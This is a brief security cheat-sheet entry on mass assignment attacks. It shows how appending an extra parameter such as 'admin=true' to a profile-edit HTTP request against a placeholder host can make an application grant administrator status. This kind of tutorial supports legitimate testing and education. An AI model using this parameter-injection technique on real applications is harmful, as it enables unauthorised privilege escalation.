# Mass Assignment Attack

## Introduction
Occurs when an app allows a user to manually add parameters in an HTTP Request & the app process value of these parameters when processing the HTTP Request & it affects the response that is returned to the user. Usually occurs in Ruby on Rails / NodeJS

## How to exploit
- Normal request
```
POST /editdata HTTP/1.1
Host: target.com
...

username=daffa
```
The response
```
HTTP/1.1 200 OK
...

{"status":"success","username":"daffainfo","isAdmin":"false"}
```

- Modified Request 
```
POST /editdata HTTP/1.1
Host: target.com
...

username=daffa&admin=true
```

```
HTTP/1.1 200 OK
...

{"status":"success","username":"daffainfo","isAdmin":"true"}
```

## References
* [Pentester Academy](https://blog.pentesteracademy.com/hunting-for-mass-assignment-56ed73095eda)